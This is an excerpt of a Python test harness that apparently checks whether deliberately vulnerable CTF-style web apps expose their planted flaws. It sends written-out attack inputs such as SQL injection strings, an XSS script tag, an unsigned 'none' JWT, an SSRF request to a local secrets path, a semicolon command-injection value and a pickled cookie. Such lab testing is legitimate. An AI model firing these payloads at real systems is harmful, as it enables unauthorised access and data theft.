...
class VulnerabilityVerifier:
    ...
    def api_login(self, app_name, username, password):
        ...
        if app_name == 'ecommerce':
            ...
            try:
                r = self.sessions[app_name].post(url, json={'username': username, 'password': password}, headers={'Accept': 'application/json'}, timeout=5)
            ...
            try:
                r = self.sessions[app_name].post(url, json={'username': username, 'password': password}, timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    self.tokens[app_name] = data.get('token')
                    return True
    ...
    def login(self, app_name, username, password):
        ...
        try:
            r = self.sessions[app_name].post(url, data={'username': username, 'password': password}, timeout=5)
    ...
    def check_vuln(self, app_name, vuln_name, url_path, method='GET', data=None, params=None, headers=None, cookies=None, expected_header='X-Vuln-Confirmed', allow_redirects=True, use_json=True):
        ...
        try:
            ...
            if method == 'GET':
                r = session.get(url, params=params, headers=req_headers, cookies=cookies, timeout=5, allow_redirects=allow_redirects)
            elif method == 'DELETE':
                r = session.delete(url, headers=req_headers, cookies=cookies, timeout=5, allow_redirects=allow_redirects)
            else:
                if use_json:
                    r = session.post(url, json=data, headers=req_headers, cookies=cookies, timeout=5, allow_redirects=allow_redirects)
                else:
                    r = session.post(url, data=data, headers=req_headers, cookies=cookies, timeout=5, allow_redirects=allow_redirects)
            
            def check_r(resp):
                if expected_header in resp.headers:
                    return f"Header: {resp.headers[expected_header]}"
                if "CTF{" in resp.text or "sqli_login_bypass" in resp.text or "sqli_search" in resp.text or "ssrf_success" in resp.text:
            ...
            for hist_r in r.history:
                msg = check_r(hist_r)
                if msg:
                    self.log(app_name, vuln_name, "SUCCESS", 1.0, msg + " (via History)")
                    return True
            ...
            if msg:
                ...
                # Debug failed tests
                debug_msg = f"Status: {r.status_code} | Headers: {list(r.headers.keys())}"
    ...
    def run_ecommerce_tests(self):
        ...
        self.check_vuln('ecommerce', 'SQLi Login (API)', '/api/login', method='POST', data={'username': "admin' OR '1'='1", 'password': 'any'}, headers={'Accept': 'application/json'})
        self.check_vuln('ecommerce', 'SQLi Search', '/api/products', params={'search': "' OR '1'='1"})
        ...
        self.check_vuln('ecommerce', 'SAML Bypass', '/saml/acs', params={'SAMLResponse': 'admin@corp.com_signature>valid'})
        exploit_obj = {'user_id': 1, 'flag_payload': True}
        pickled = pickle.dumps(exploit_obj)
        exploit = base64.b64encode(pickled).decode()
        self.check_vuln('ecommerce', 'Insecure Deserialization', '/preferences', cookies={'prefs': exploit}, use_json=False)

    def run_social_tests(self):
        print("\n--- Testing Social Media (5003) ---")
        self.check_vuln('social', 'Weak Password (Reg)', '/register', method='POST', 
                        data={'username': 'testuser_'+str(int(time.time()*100)), 'password': '123', 'email': 'test@test.com'},
                        use_json=False)
        self.check_vuln('social', 'SQLi Search', '/api/search', params={'q': "' OR '1'='1"})
        self.check_vuln('social', 'Predictable Reset Token', '/api/password-reset', method='POST', data={'email': 'admin@social.com'})
        self.check_vuln('social', 'OAuth Bypass', '/oauth/callback', params={'code': 'ATTACKER_CONTROLLED_CODE', 'state': 'ANY_STATE'})
        ...
        self.check_vuln('social', 'Session Fixation', '/login', method='POST', 
                        data={'username': 'user1', 'password': 'password123'}, 
                        use_json=False) # Should work as it sends cookies automatically
    ...
    def run_banking_tests(self):
        ...
        if self.login('banking', 'user_john', 'password123'):
            ...
            self.check_vuln('banking', 'CSRF Bypass', '/transfer', method='POST', data={'to_account': '2', 'amount': '100', 'csrf_token': 'EXPLOIT_BYPASS'}, use_json=False)

    def run_blog_tests(self):
        print("\n--- Testing Blog (5005) ---")
        self.check_vuln('blog', 'Reflected XSS', '/api/posts', params={'q': '<script>alert(1)</script>'})
        token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
        self.check_vuln('blog', 'JWT None Bypass', '/oidc/callback', params={'token': token})
        if self.login('blog', 'admin', 'admin123'):
            self.check_vuln('blog', 'Stored XSS', '/post/1')
            self.check_vuln('blog', 'SSRF', '/import_post', method='POST', data={'url': 'http://127.0.0.1/admin/secrets'}, use_json=False)

    def run_fileshare_tests(self):
        print("\n--- Testing FileShare (5006) ---")
        self.check_vuln('fileshare', 'Command Injection', '/check_status', params={'host': '; echo flag_cmd'}) 
        if self.login('fileshare', 'user', 'password'):
            ...
            try:
                ...
                if 'X-Vuln-Confirmed' in r.headers:
                    self.log('fileshare', 'Unrestricted Upload', 'SUCCESS', 1.0, f"Header: {r.headers['X-Vuln-Confirmed']}")
                else:
                    self.log('fileshare', 'Unrestricted Upload', 'FAILED', 0.0, f"Status: {r.status_code}")
            except Exception as e:
